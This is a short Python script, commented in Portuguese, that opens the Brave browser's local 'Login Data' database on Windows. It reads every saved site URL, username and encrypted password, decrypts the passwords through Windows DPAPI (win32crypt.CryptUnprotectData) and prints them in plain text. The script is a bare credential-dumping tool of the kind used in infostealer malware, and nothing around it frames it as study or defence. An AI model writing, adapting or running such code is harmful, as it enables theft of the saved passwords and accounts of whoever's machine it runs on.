import os
import sqlite3
import win32crypt

# Caminho do banco de dados do Brave
brave_db = os.path.expandvars(r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Login Data')

# Conectar ao banco de dados SQLite
conn = sqlite3.connect(brave_db)
cursor = conn.cursor()

# Selecionar as senhas
cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
for row in cursor.fetchall():
    url = row[0]
    username = row[1]
    encrypted_password = row[2]
    try:
        # Descriptografar a senha
        password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
        password = password.decode('utf-8') if password else "Sem senha"
    except Exception as e:
        password = f"Erro ao descriptografar: {str(e)}"
    print(f"URL: {url}\nUsername: {username}\nPassword: {password}\n")

conn.close()